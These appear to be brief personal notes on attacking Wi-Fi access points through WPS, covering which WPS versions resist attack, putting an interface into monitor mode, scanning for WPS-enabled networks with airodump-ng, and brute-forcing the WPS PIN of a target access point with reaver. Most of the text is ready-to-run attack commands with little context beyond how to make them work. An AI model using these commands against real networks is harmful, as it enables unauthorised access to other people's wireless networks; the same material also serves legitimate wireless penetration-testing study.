Information we are interested in :

->MAC address + WPS version

If an Ap is running WPS version 2.0 ot is unlikely that wewill be able to use any vector beyond pixie dust attacks (due to the lockout).

!! used with reaver causes a bug (solution : iw dev wlan0 interface add mon0 type monitor) airmon-ng start wlan0 (starting interface in monitor mode)

airodump-ng --wps --ignore-negative-one wlan0mon ( view all the interfaces that have WPS)


Online PIN brute forcing :

reaver -i mon0 -b 62:06:76:DA:44:F7 -c 1 -vv (will brute force every possible PIN 11,000)
